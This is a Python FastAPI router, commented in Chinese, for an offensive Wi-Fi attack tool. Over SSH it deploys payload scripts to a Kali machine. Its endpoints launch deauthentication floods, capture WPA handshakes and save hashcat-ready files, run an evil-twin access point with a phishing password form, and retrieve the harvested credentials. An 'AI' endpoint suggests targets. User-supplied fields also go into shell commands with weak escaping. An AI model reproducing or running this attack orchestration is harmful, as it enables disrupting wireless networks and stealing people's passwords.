from fastapi import APIRouter, HTTPException
from fastapi.responses import FileResponse
from pydantic import BaseModel
from app.modules.ai_agent.service import ai_service
from app.core.ssh_manager import ssh_client
import os
import time
import json
from pathlib import Path

router = APIRouter()


# ==========================================
# 1. 请求模型定义
# ==========================================
class AttackRequest(BaseModel):
    # 基础参数
    bssid: str
    interface: str = "wlan0"  # 攻击/监听网卡
    channel: str = "1"
    duration: int = 60  # 攻击时长

    # --- Evil Twin (双子热点) 专用参数 ---
    ap_interface: str = "wlan1"
    ssid: str = "Free_WiFi"
    template_html: str = ""


class AIAnalysisRequest(BaseModel):
    ssid: str
    encryption: str
    bssid: str


# ==========================================
# 2. 辅助工具：更强壮的路径查找
# ==========================================
def find_payload_script(script_name: str):
    """
    更智能地查找 kali_payloads 脚本路径
    """
    current_file = Path(__file__).resolve()

    # 定义可能的项目根目录位置
    # 1. 假设我们在 backend/app/api/v1/endpoints/
    #    parents[4] = backend, parents[5] = 项目根目录
    # 2. 假设是 Docker 环境，可能在 /app/kali_payloads
    search_paths = [
        current_file.parents[5] / "kali_payloads" / script_name,  # 标准开发环境
        current_file.parents[4] / "kali_payloads" / script_name,
        Path.cwd() / "kali_payloads" / script_name,  # 以此处运行目录为基准
        Path.cwd().parent / "kali_payloads" / script_name,  # 上一级目录
        Path("/app/kali_payloads") / script_name,  # Docker 常见路径
    ]

    for p in search_paths:
        if p.exists():
            return str(p)

    # 如果都找不到，打印日志帮助调试
    print(f"[!] Critical Error: Cannot find {script_name} in any of: {[str(p) for p in search_paths]}")
    return None


# ==========================================
# 3. 基础功能：文件下载
# ==========================================
@router.get("/download/{filename}")
async def download_file(filename: str):
    if ".." in filename or "/" in filename:
        raise HTTPException(400, "Invalid filename")

    # 尝试在 backend/captures 或当前目录寻找
    possible_paths = [
        Path.cwd() / "captures" / filename,
        Path(__file__).resolve().parents[4] / "captures" / filename
    ]

    file_path = None
    for p in possible_paths:
        if p.exists():
            file_path = p
            break

    if not file_path:
        raise HTTPException(404, "File not found")

    return FileResponse(path=file_path, filename=filename, media_type='application/octet-stream')


# ==========================================
# 4. 核心攻击功能：Deauth
# ==========================================
@router.post("/deauth")
async def start_deauth_attack(req: AttackRequest):
    if not ssh_client.client:
        try:
            ssh_client.connect()
        except Exception as e:
            raise HTTPException(500, f"SSH 连接失败: {str(e)}")

    script_name = "attack_worker.py"
    local_path = find_payload_script(script_name)
    if not local_path:
        raise HTTPException(500, f"后端错误: 找不到本地脚本 {script_name}")

    try:
        remote_path = ssh_client.upload_payload(local_path, script_name)
        if not remote_path:
            raise HTTPException(500, "文件上传到 Kali 失败")

        duration = int(req.duration)
        # 加上 nohup 并在后台运行
        cmd = f"nohup python3 {remote_path} deauth --bssid {req.bssid} --interface {req.interface} --channel {req.channel} --duration {duration} > /tmp/attack_deauth.log 2>&1 &"
        ssh_client.exec_command(cmd)

        return {"status": "started", "msg": "Deauth 攻击已启动", "log": "/tmp/attack_deauth.log"}
    except Exception as e:
        raise HTTPException(500, f"执行异常: {str(e)}")


# ==========================================
# 5. 核心攻击功能：握手包捕获 (已修复超时与部署)
# ==========================================
@router.post("/handshake")
async def start_handshake_capture(req: AttackRequest):
    if not ssh_client.client: ssh_client.connect()

    script_name = "attack_worker.py"
    local_path = find_payload_script(script_name)
    if not local_path:
        raise HTTPException(500, f"无法定位 Payload: {script_name}，请检查项目目录结构")

    # 1. 部署/更新脚本到 Kali
    remote_path = ssh_client.upload_payload(local_path, script_name)
    if not remote_path:
        raise HTTPException(500, "SSH 上传脚本失败，请检查 Kali 磁盘空间或权限")

    # 2. 构造命令
    cmd = f"python3 {remote_path} handshake --bssid {req.bssid} --interface {req.interface} --channel {req.channel} --duration {req.duration}"

    try:
        # 【关键修复】
        # timeout: 设为 duration + 25秒，给 SSH 连接和脚本启动留出余量
        # get_pty=True: 强制分配伪终端，确保 stdout 能实时输出，并且 stdout.read() 不会因为缓冲而为空
        timeout_val = int(req.duration) + 25
        stdin, stdout, stderr = ssh_client.exec_command(cmd, timeout=timeout_val, get_pty=True)

        # 读取完整输出
        output = stdout.read().decode()

        response_data = {"status": "failed", "msg": "未捕获到握手包", "debug": output}

        # 3. 结果处理
        # 确保本地 captures 目录存在
        local_dir = Path.cwd() / "captures"
        if not local_dir.exists(): local_dir.mkdir(parents=True, exist_ok=True)

        if "CAPTURED_HS_POTENTIAL" in output:
            remote_prefix = f"/tmp/handshake_{req.bssid.replace(':', '')}"
            ts = int(time.time())

            # A. 下载 .cap 文件
            remote_cap = f"{remote_prefix}-01.cap"
            local_cap = f"handshake_{req.bssid.replace(':', '')}_{ts}.cap"

            # 先检查远程文件是否存在
            _in, _out, _err = ssh_client.exec_command(f"ls {remote_cap}")
            if not _err.read():
                if ssh_client.download_file(remote_cap, str(local_dir / local_cap)):
                    response_data["status"] = "success"
                    response_data["msg"] = "成功捕获握手包"
                    response_data["cap_file"] = local_cap

            # B. 下载 Hashcat 文件 (如果有)
            remote_hc = f"{remote_prefix}.hc22000"
            local_hc = f"handshake_{req.bssid.replace(':', '')}_{ts}.hc22000"
            _in, _out, _err = ssh_client.exec_command(f"ls {remote_hc}")
            if not _err.read():
                if ssh_client.download_file(remote_hc, str(local_dir / local_hc)):
                    response_data["hash_file"] = local_hc

        return response_data

    except Exception as e:
        # 捕获 SSH 超时或其他错误
        print(f"[!] Handshake Error: {e}")
        return {"status": "error", "msg": f"执行出错或超时: {str(e)}"}


# ==========================================
# 6. AI 分析接口
# ==========================================
@router.post("/ai/analyze_target")
async def analyze_target(req: AIAnalysisRequest):
    try:
        raw = ai_service.analyze_wifi_target(req.ssid, req.encryption, "Unknown")
        if isinstance(raw, dict) and "risk_level" in raw: return raw
        return {"risk_level": "中", "summary": "Info", "advice": "Attempt handshake capture"}
    except:
        return {"risk_level": "Unknown"}


# ==========================================
# 7. Evil Twin 接口
# ==========================================
@router.get("/eviltwin/templates")
async def get_templates():
    return {"status": "success", "data": [
        {"name": "Generic Login",
         "content": "<html><body><h1>Login</h1><form method='POST'><input name='p' type='password'><button>Go</button></form></body></html>"}
    ]}


@router.post("/eviltwin/start")
async def start_evil_twin(req: AttackRequest):
    if req.interface == req.ap_interface:
        raise HTTPException(400, "Interfaces must be different")

    if not ssh_client.client: ssh_client.connect()

    et_script = ssh_client.upload_payload(find_payload_script("eviltwin_worker.py"), "eviltwin_worker.py")
    atk_script = ssh_client.upload_payload(find_payload_script("attack_worker.py"), "attack_worker.py")

    if not et_script or not atk_script:
        raise HTTPException(500, "脚本上传失败")

    clean_html = req.template_html.replace('"', '\\"').replace('`', '\\`')

    ssh_client.exec_command("echo '[Init] Starting AP...' > /tmp/eviltwin.log")
    cmd_ap = f"nohup python3 {et_script} --interface {req.ap_interface} --ssid '{req.ssid}' --channel {req.channel} --template \"{clean_html}\" >> /tmp/eviltwin.log 2>&1 &"
    ssh_client.exec_command(cmd_ap)

    ssh_client.exec_command("echo '[Init] Starting Attack...' > /tmp/et_deauth.log")
    cmd_atk = f"nohup python3 {atk_script} deauth --bssid {req.bssid} --interface {req.interface} --channel {req.channel} --duration 0 >> /tmp/et_deauth.log 2>&1 &"
    ssh_client.exec_command(cmd_atk)

    return {"status": "started", "msg": "Evil Twin Started"}


@router.post("/eviltwin/stop")
async def stop_evil_twin():
    if not ssh_client.client: ssh_client.connect()
    ssh_client.exec_command("pkill -f eviltwin_worker.py")
    ssh_client.exec_command("pkill -f attack_worker.py")
    ssh_client.exec_command("killall hostapd dnsmasq aireplay-ng airodump-ng")
    ssh_client.exec_command("iptables -t nat -F")
    return {"status": "success"}


@router.get("/eviltwin/credentials")
async def get_creds():
    if not ssh_client.client: ssh_client.connect()
    try:
        out = ssh_client.exec_command("cat /tmp/eviltwin/captured_creds.txt")[1].read().decode()
        return {"status": "success", "data": [l.strip() for l in out.splitlines() if l.strip()]}
    except:
        return {"status": "empty", "data": []}


@router.get("/eviltwin/logs")
async def get_logs():
    if not ssh_client.client: ssh_client.connect()
    try:
        cmd = "tail -n 5 /tmp/eviltwin.log; echo '---'; tail -n 5 /tmp/et_deauth.log"
        out = ssh_client.exec_command(cmd)[1].read().decode()
        return {"status": "success", "logs": [l.strip() for l in out.splitlines() if l.strip()]}
    except:
        return {"status": "error", "logs": []}